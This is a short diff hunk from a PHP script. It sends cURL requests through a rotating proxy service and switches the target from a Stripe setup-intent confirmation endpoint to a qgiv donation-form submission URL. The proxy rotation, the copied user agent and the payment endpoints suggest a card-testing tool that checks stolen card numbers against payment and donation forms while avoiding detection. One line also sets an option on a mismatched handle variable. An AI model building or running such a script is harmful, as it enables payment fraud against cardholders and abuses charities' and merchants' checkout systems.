@@ -113,7 +113,7 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/seti_1IbUXlE34W4cUVtTzJzbVDh1/confirm');
+curl_setopt($ch, CURLOPT_URL, 'https://secure.qgiv.com/for/whom/submit?csrfToken=vSBpbvrsgk5v');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
